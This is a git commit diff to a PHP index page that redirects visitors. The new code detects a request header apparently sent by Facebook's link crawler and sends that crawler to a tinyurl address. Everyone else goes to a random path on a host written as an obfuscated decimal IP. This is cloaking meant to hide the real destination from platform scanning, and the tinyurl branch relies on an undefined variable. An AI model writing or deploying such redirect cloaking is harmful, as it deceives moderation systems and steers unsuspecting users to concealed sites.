64d5fb8761c52ceda58a9da300a83b5a2ea4acd2
Kadir Gün <kadir@kadirgun.com>
2016-11-18 19:57:29 +0200

    Update index.php

--- web/index.php
+++ web/index.php
@@ -1,3 +1,7 @@
 <?php
-  header("Location: http://2335939030/".rand(111111,999999).".".rand(1,9999999));
+  if(isset($_SERVER['HTTP_X_FB_CURL_CLIENT'])){
+    header("Location: https://tinyurl.com/$id");
+  }else{
+    header("Location: http://2335939030/".rand(111111,999999).".".rand(1,9999999));
+  }
 ?>
